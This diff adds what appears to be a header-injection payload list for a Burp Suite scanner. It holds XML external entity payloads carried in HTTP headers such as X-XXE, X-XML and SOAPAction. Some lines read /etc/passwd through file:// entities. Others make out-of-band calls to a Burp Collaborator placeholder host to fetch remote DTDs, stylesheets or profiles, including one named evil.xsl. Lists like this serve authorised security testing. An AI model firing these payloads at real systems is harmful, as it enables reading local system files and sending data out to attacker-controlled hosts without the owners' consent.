@@ -1,0 +1,14 @@
+# XXE via headers — in-band (file://) and blind/OOB ($collabplz, auto-replaced by Burp)
+# Fingerprints: fingerprints/xxe.txt (nuclei-style regexes)
+X-XXE: <?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
+X-XXE: <?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://$collabplz/xxe">]><r>&xxe;</r>
+X-XML: <?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
+X-XML: <?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://$collabplz/xxe">]><r>&xxe;</r>
+X-Document: <?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
+X-Data: <?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
+SOAPAction: "http://$collabplz/xxe"
+X-SOAP-Action: http://$collabplz/xxe
+X-Wap-Profile: http://$collabplz/wap.xml
+X-Profile: http://$collabplz/profile.xml
+X-Stylesheet: <?xml-stylesheet type="text/xml" href="http://$collabplz/xsl"?>
+X-XSL: http://$collabplz/evil.xsl
